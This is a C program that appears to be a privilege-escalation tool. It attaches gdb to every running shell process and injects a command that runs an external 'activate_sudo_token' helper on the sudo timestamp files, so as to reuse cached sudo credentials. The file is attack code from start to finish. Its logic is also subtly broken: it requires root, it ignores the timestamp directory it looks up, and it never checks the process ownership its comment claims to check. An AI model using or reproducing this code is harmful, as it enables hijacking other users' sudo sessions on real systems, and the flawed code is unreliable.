#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

// Function to run a shell command
void run_command(const char *command) {
    system(command);
}

// Function to inject the sudo token activation into the process using gdb
void inject_sudo_token(pid_t pid) {
    char command[512];
    snprintf(command, sizeof(command), "echo 'call system(\"echo | sudo -S /tmp/activate_sudo_token /var/lib/sudo/ts/* >/dev/null 2>&1\")' | gdb -q -n -p %d >/dev/null 2>&1", pid);
    run_command(command);
}

int main() {
    // Check if the script is being run as root
    if (getuid() != 0) {
        printf("This script must be run as root.\n");
        return 1;
    }

    // Copy the sudo token activation script to /tmp and make it executable
    run_command("cp activate_sudo_token /tmp/");
    run_command("chmod +x /tmp/activate_sudo_token");

    // Retrieve the sudo timestamp directory
    FILE *fp = popen("sudo --version | grep 'timestamp dir' | grep -o '/.*'", "r");
    if (!fp) {
        printf("Could not determine timestamp directory.\n");
        return 1;
    }
    char timestamp_dir[256];
    if (fgets(timestamp_dir, sizeof(timestamp_dir), fp) == NULL) {
        printf("Could not retrieve timestamp directory.\n");
        fclose(fp);
        return 1;
    }
    fclose(fp);

    // Iterate over processes owned by the current user
    DIR *dir = opendir("/proc");
    if (dir == NULL) {
        perror("Could not open /proc directory");
        return 1;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        pid_t pid = atoi(entry->d_name);
        if (pid == 0) continue; // Skip non-numeric entries

        char comm[256];
        snprintf(comm, sizeof(comm), "/proc/%d/comm", pid);
        FILE *comm_file = fopen(comm, "r");
        if (comm_file == NULL) continue;

        // Read process name
        if (fgets(comm, sizeof(comm), comm_file) != NULL) {
            // Strip newline character if present
            comm[strcspn(comm, "\n")] = 0;

            // Check if the process is owned by the current user and is a shell process
            if (strcmp(comm, "bash") == 0 || strcmp(comm, "zsh") == 0 || strcmp(comm, "sh") == 0 ||
                strcmp(comm, "csh") == 0 || strcmp(comm, "ksh") == 0 || strcmp(comm, "tcsh") == 0 ||
                strcmp(comm, "dash") == 0) {
                // Skip the current process (the script itself)
                if (pid != getpid()) {
                    printf("Injecting process %d -> %s\n", pid, comm);
                    inject_sudo_token(pid);
                }
            }
        }
        fclose(comm_file);
    }

    closedir(dir);
    return 0;
}
